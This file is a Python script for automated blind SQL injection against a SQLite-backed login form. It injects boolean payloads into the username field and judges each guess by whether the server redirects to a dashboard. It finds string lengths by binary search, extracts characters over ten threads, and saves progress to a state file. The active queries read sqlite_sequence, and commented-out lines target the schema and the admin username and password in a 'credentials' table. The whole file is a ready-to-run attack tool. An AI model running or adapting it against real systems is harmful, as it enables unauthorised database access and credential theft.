import requests
import string
import sys
import time
import concurrent.futures
import json
import os

if len(sys.argv) < 2:
    print(f"Usage: {sys.argv[0]} <url>")
    sys.exit(1)

url = sys.argv[1]
# Extended charset
chars = string.ascii_lowercase + string.ascii_uppercase + string.digits + "_- .,()'" + "{}" + "\n\t" + "*:;!@#$%^&+=<>?/"

STATE_FILE = "exploit_state.json"

def load_state():
    if os.path.exists(STATE_FILE):
        try:
            with open(STATE_FILE, "r") as f:
                return json.load(f)
        except:
            return {}
    return {}

def save_state(state):
    with open(STATE_FILE, "w") as f:
        json.dump(state, f)

def check(payload):
    data = {
        "username": payload,
        "password": "test"
    }
    retries = 0
    while retries < 5:
        try:
            r = requests.post(url, data=data, allow_redirects=False, timeout=5)
            return r.status_code == 302 and r.headers.get('Location', '').endswith('dashboard')
        except Exception as e:
            # print(f"Error: {e}, retrying...")
            time.sleep(1)
            retries += 1
    return False

def get_length(query):
    low = 0
    high = 1000 # Adjust if needed
    while low < high:
        mid = (low + high + 1) // 2
        payload = f"admin' AND (SELECT length(({query}))) >= {mid}--"
        if check(payload):
            low = mid
        else:
            high = mid - 1
    return low

def get_char(index, query):
    for c in chars:
        payload = f"admin' AND (SELECT substr(({query}),{index},1))='{c}'--"
        if check(payload):
            return c
    return None

def get_data(query):
    state = load_state()
    
    if query in state:
        print(f"Resuming query: {query}")
        saved_data = state[query]
        length = saved_data["length"]
        result = list(saved_data["result"])
        print(f"Length: {length}")
        print(f"Current progress: {''.join(result)}")
    else:
        print(f"Calculating length for query: {query}")
        length = get_length(query)
        print(f"Length: {length}")
        if length == 0:
            return ""
        result = ['.'] * length
        state[query] = {"length": length, "result": "".join(result)}
        save_state(state)

    print(f"Extracting {length} characters...")
    
    # Identify missing indices (0-based for list)
    missing_indices = [i for i, c in enumerate(result) if c == '.']
    
    if not missing_indices:
        return "".join(result)

    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
        # 1-based index for SQL, 0-based for list
        future_to_index = {executor.submit(get_char, i + 1, query): i for i in missing_indices}
        
        for future in concurrent.futures.as_completed(future_to_index):
            i = future_to_index[future]
            try:
                char = future.result()
                if char:
                    result[i] = char
                    # Update state
                    state = load_state()
                    state[query]["result"] = "".join(result)
                    save_state(state)
                    
                    # Print current progress
                    sys.stdout.write(f"\r{''.join(result)}")
                    sys.stdout.flush()
            except Exception as exc:
                print(f'\nIndex {i+1} generated an exception: {exc}')
    
    print()
    final_result = "".join(result)
    return final_result

# print("Extracting schema for table 'credentials'...")
# schema = get_data("SELECT sql FROM sqlite_master WHERE type='table' AND tbl_name='credentials'")
# print(f"Schema: {schema}")

# print("Extracting data from credentials...")
# # Extracting username and password for the first user (likely admin)
# username = get_data("SELECT username FROM credentials LIMIT 1 OFFSET 0")
# password = get_data("SELECT password FROM credentials LIMIT 1 OFFSET 0")
# print(f"Username: {username}")
# print(f"Password: {password}")

print("Extracting data from sqlite_sequence...")
name = get_data("SELECT name FROM sqlite_sequence LIMIT 1")
seq = get_data("SELECT seq FROM sqlite_sequence LIMIT 1")
print(f"Name: {name}")
print(f"Seq: {seq}")
